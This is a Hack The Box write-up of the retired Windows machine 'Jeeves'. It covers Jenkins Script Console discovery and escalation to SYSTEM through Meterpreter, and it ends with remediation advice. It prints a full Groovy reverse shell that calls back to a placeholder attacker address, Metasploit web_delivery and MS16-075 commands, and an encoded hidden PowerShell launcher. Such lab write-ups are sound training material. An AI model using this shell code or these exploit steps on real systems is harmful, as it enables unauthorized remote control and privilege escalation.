# Jeeves — Hack The Box Write-up

> **Status:** Retired  
> **Platform:** Hack The Box  
> **Operating System:** Windows  
> **Difficulty:** Medium

## Disclaimer

This write-up documents an authorized cybersecurity training environment.

All IP addresses, VPN addresses, credentials, payloads, and flags have been removed or replaced with placeholders.

---

## Machine Information

| Item | Value |
|---|---|
| Target | `MACHINE_IP` |
| Attacker VPN Address | `VPN_IP` |
| Hostname | `JEEVES` |
| Operating System | Windows 10 Pro, Version 1511, Build 10586 |
| Architecture | x64 |
| Initial User | `JEEVES\kohsuke` |
| Final Privilege | `NT AUTHORITY\SYSTEM` |

---

## Executive Summary

The Jeeves machine exposed a Jenkins instance through Jetty on TCP port `50000`.

The Jenkins Script Console allowed arbitrary Groovy code execution, which was used to obtain a reverse Windows command shell as `JEEVES\kohsuke`.

Local enumeration revealed that the compromised account possessed `SeImpersonatePrivilege`. The shell was upgraded to Meterpreter, and the session was later confirmed to be running as `NT AUTHORITY\SYSTEM`.

The user flag was located on the `kohsuke` desktop. The root flag was concealed inside an NTFS Alternate Data Stream attached to `hm.txt` on the Administrator desktop.

---

## Attack Path

```text
Nmap Scan
    ↓
Jetty on Port 50000
    ↓
Directory Enumeration
    ↓
Jenkins Script Console
    ↓
Groovy Reverse Shell
    ↓
JEEVES\kohsuke
    ↓
Meterpreter Upgrade
    ↓
SYSTEM Privileges
    ↓
NTFS Alternate Data Stream
    ↓
Root Flag
```

---

# 1. Reconnaissance

## Full Port Scan

A full TCP port scan was performed against the target:

```bash
nmap -A -Pn -v -p- -T4 MACHINE_IP
```

### Discovered Services

| Port | Service |
|---:|---|
| 80/tcp | Microsoft IIS 10.0 |
| 135/tcp | Microsoft Windows RPC |
| 445/tcp | Windows SMB |
| 50000/tcp | Jetty 9.4.z-SNAPSHOT |

Port `50000` exposed an HTTP service running through Jetty and was selected for additional enumeration.

---

# 2. Web Enumeration

Directory enumeration was performed against the Jetty service:

```bash
gobuster dir \
-u http://MACHINE_IP:50000/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html \
-t 50
```

The scan discovered:

```text
/askjeeves/    Status: 302
```

The application was available at:

```text
http://MACHINE_IP:50000/askjeeves/
```

The application was identified as Jenkins.

---

# 3. Initial Access

## Identify the VPN Callback Address

The local network interfaces were inspected:

```bash
ip a
```

The Hack The Box VPN interface was:

```text
tun0: VPN_IP
```

The `tun0` address was used for reverse-shell and Meterpreter callbacks.

## Start a Netcat Listener

```bash
nc -nvlp 8044
```

## Jenkins Script Console

The Jenkins Script Console allowed Groovy code to be executed directly on the server.

The following Groovy reverse shell was used:

```groovy
String host="VPN_IP";
int port=8044;
String cmd="cmd.exe";

Process p=new ProcessBuilder(cmd)
    .redirectErrorStream(true)
    .start();

Socket s=new Socket(host,port);

InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();

OutputStream po=p.getOutputStream(),
             so=s.getOutputStream();

while(!s.isClosed()){
    while(pi.available()>0)
        so.write(pi.read());

    while(pe.available()>0)
        so.write(pe.read());

    while(si.available()>0)
        po.write(si.read());

    so.flush();
    po.flush();

    Thread.sleep(50);

    try {
        p.exitValue();
        break;
    } catch(Exception e){}
}

p.destroy();
s.close();
```

The listener received a connection:

```text
connect to [VPN_IP] from [MACHINE_IP]
```

A Windows command shell was obtained.

---

# 4. Initial User Enumeration

The compromised account was identified using:

```cmd
whoami
```

Result:

```text
jeeves\kohsuke
```

## Privilege Enumeration

```cmd
whoami /priv
```

Important result:

```text
SeImpersonatePrivilege    Enabled
```

`SeImpersonatePrivilege` indicated that token impersonation or Potato-style privilege-escalation techniques could be relevant.

## Operating-System Enumeration

```cmd
systeminfo
```

Important results:

```text
Host Name:       JEEVES
OS Name:         Microsoft Windows 10 Pro
OS Version:      10.0.10586 Build 10586
System Type:     x64-based PC
Domain:          WORKGROUP
```

The installed hotfixes were also recorded for local exploit analysis.

---

# 5. Windows Exploit Suggester

The `systeminfo` output was saved locally as:

```text
sysinfo.txt
```

Windows Exploit Suggester was executed using:

```bash
python2 windows-exploit-suggester.py \
--database 2026-07-09-mssb.xls \
--systeminfo sysinfo.txt
```

Important candidates included:

```text
MS16-135
MS16-098
MS16-075
MS16-074
MS16-032
MS16-016
```

These results were treated as candidates requiring further validation rather than confirmation that the system was exploitable.

---

# 6. Upgrade to Meterpreter

Metasploit Web Delivery was configured:

```text
use exploit/multi/script/web_delivery
show targets
set target 2
set payload windows/meterpreter/reverse_tcp
set LHOST VPN_IP
set SRVHOST 0.0.0.0
set LPORT 4444
run
```

Metasploit generated a PowerShell command similar to:

```powershell
powershell.exe -nop -w hidden -e BASE64_PAYLOAD
```

The generated command was executed from the existing Jenkins command shell.

Result:

```text
Meterpreter session 1 opened
JEEVES\kohsuke @ JEEVES
```

The shell was successfully upgraded, but the initial privilege level remained `JEEVES\kohsuke`.

---

# 7. Meterpreter Enumeration

The session was accessed using:

```text
sessions -i 1
```

The following Meterpreter commands were executed:

```text
getuid
sysinfo
getprivs
```

Results:

```text
User:          JEEVES\kohsuke
OS:            Windows 10 Build 10586
Architecture:  x64
Meterpreter:   x86/windows
Privilege:     SeImpersonatePrivilege
```

---

# 8. Local Exploit Enumeration

Metasploit Local Exploit Suggester was executed:

```text
run post/multi/recon/local_exploit_suggester
```

Important candidates included:

```text
bits_ntlm_token_impersonation
bypassuac_comhijack
bypassuac_eventvwr
bypassuac_fodhelper
bypassuac_sluihijack
cve_2020_0787_bits_arbitrary_file_move
cve_2020_1048_printerdemon
cve_2020_1337_printerdemon
ms16_075_reflection
ms16_075_reflection_juicy
tokenmagic
```

---

# 9. Privilege-Escalation Investigation

The Meterpreter session was later observed running as:

```text
NT AUTHORITY\SYSTEM
```

The original output from the command that first elevated the session was not preserved.

The likely command used during the session was:

```text
getsystem
```

However, because the original successful output was not recorded, the precise elevation mechanism cannot be stated with complete certainty.

## MS16-075 Validation

The Meterpreter session was placed in the background:

```text
background
```

The local exploit was selected from the main Metasploit console:

```text
use exploit/windows/local/ms16_075_reflection
```

The module was configured using:

```text
set SESSION 1
set LHOST VPN_IP
set LPORT 5555
set payload windows/x64/meterpreter/reverse_tcp
run
```

Result:

```text
Exploit aborted due to failure: Session is already elevated
Exploit completed, but no session was created
```

This result is important:

> MS16-075 did not elevate the session during this execution. The module aborted because Session 1 was already running with elevated privileges.

---

# 10. Confirm SYSTEM Access

The original Meterpreter session was reopened:

```text
sessions -i 1
```

The current user was checked:

```text
getuid
```

Result:

```text
Server username: NT AUTHORITY\SYSTEM
```

Running `getsystem` again returned:

```text
Already running as SYSTEM
```

SYSTEM-level access was therefore confirmed.

---

# 11. Token Enumeration

The Incognito extension was loaded:

```text
load incognito
```

Available user tokens were enumerated:

```text
list_tokens -u
```

Result:

```text
Delegation Tokens Available:
No tokens available

Impersonation Tokens Available:
No tokens available
```

No reusable delegation or impersonation tokens were available at that time.

---

# 12. Native Windows Shell

A native Windows command shell was opened from Meterpreter:

```text
shell
```

The resulting `cmd.exe` process inherited SYSTEM privileges.

---

# 13. User Flag

The `kohsuke` desktop was inspected:

```cmd
cd C:\Users\kohsuke\Desktop
dir
```

The user flag was read using:

```cmd
type user.txt
```

The flag value has intentionally been omitted.

---

# 14. Administrator Desktop

The Administrator desktop was inspected:

```cmd
cd C:\Users\Administrator\Desktop
dir /a
```

The file `hm.txt` was discovered:

```cmd
type hm.txt
```

Result:

```text
The flag is elsewhere. Look deeper.
```

This message suggested that the flag was hidden using a less obvious filesystem feature.

---

# 15. NTFS Alternate Data Stream

NTFS Alternate Data Streams were enumerated using:

```cmd
dir /R
```

Result:

```text
hm.txt
hm.txt:root.txt:$DATA
```

The root flag was stored inside an Alternate Data Stream named:

```text
root.txt
```

The stream was attached to:

```text
hm.txt
```

## Retrieve the Root Flag

The Alternate Data Stream was read using:

```cmd
more < hm.txt:root.txt:$DATA
```

The root flag was successfully retrieved.

The flag value has intentionally been omitted.

---

# 16. Troubleshooting Notes

Several configuration mistakes occurred during the assessment.

## Incorrect Callback Address

Incorrect:

```text
set LHOST MACHINE_IP
set SRVHOST MACHINE_IP
```

Correct:

```text
set LHOST VPN_IP
set SRVHOST 0.0.0.0
```

`LHOST` must point to the attacker's reachable VPN address, not the target address.

## Incorrect Session Command

Incorrect:

```text
session 1
```

Correct:

```text
sessions -i 1
```

## Running `use` Inside Meterpreter

The following command cannot be executed directly inside Meterpreter:

```text
use exploit/windows/local/ms16_075_reflection
```

The session must first be backgrounded:

```text
background
```

The exploit can then be selected from the main Metasploit console.

## Incorrect LPORT Value

Incorrect:

```text
set LPORT VPN_IP
```

Correct:

```text
set LPORT 5555
```

`LPORT` must contain a valid TCP port number.

---

# 17. Vulnerabilities and Weaknesses

| Finding | Severity | Impact |
|---|---:|---|
| Exposed Jenkins Script Console | Critical | Allowed arbitrary server-side code execution |
| Jenkins running with excessive local privileges | Critical | Supported escalation to SYSTEM |
| `SeImpersonatePrivilege` assigned to the compromised account | High | Enabled token-impersonation attack possibilities |
| Outdated Windows operating system | High | Exposed the host to multiple historical privilege-escalation vulnerabilities |
| Sensitive flag stored in an NTFS Alternate Data Stream | Informational | Demonstrated how data may be concealed from basic directory listings |

---

# 18. Remediation

## Secure Jenkins

- Require authentication for all administrative Jenkins interfaces.
- Disable or tightly restrict access to the Script Console.
- Restrict Jenkins to trusted management networks.
- Apply current Jenkins and plugin updates.
- Review Jenkins users, API tokens, credentials, and installed plugins.

## Apply Least Privilege

- Run Jenkins under a dedicated low-privilege service account.
- Remove unnecessary token impersonation privileges.
- Prevent service accounts from receiving local administrator rights.
- Review Windows user-right assignments regularly.

## Patch and Upgrade Windows

- Replace unsupported Windows builds.
- Apply current cumulative security updates.
- Maintain an enterprise patch-management process.
- Remove obsolete or unnecessary services.

## Network Segmentation

- Restrict Jenkins and Jetty management ports through firewall rules.
- Prevent direct access to administrative services from untrusted networks.
- Place build systems inside a dedicated management or application segment.

## Monitoring

- Monitor Jenkins Script Console activity.
- Alert on suspicious PowerShell execution.
- Monitor creation of reverse connections and unusual child processes.
- Detect unexpected SYSTEM-level command shells.

---

# 19. Tools Used

| Tool | Purpose |
|---|---|
| Nmap | Port and service discovery |
| Gobuster | Web-directory enumeration |
| Netcat | Reverse-shell listener |
| Jenkins Script Console | Groovy code execution |
| Windows Exploit Suggester | Local vulnerability candidate identification |
| Metasploit Framework | Shell upgrade and local exploit validation |
| Meterpreter | Post-exploitation enumeration |
| Incognito | Windows token enumeration |

---

# 20. Lessons Learned

- High-numbered ports must be investigated as carefully as standard web ports.
- An exposed Jenkins Script Console can provide immediate remote code execution.
- Callback payloads must use the attacker's reachable VPN interface.
- Exploit suggester results are candidates, not proof that an exploit will succeed.
- Privilege-escalation evidence must be recorded before claiming which technique succeeded.
- `SeImpersonatePrivilege` is a significant privilege-escalation indicator.
- NTFS Alternate Data Streams can conceal data from normal directory listings.

---

## Ethical Use

All security content published here relates only to authorized laboratories, retired training environments, academic projects, or intentionally vulnerable systems.

> Learn the attack. Understand the weakness. Strengthen the defense.
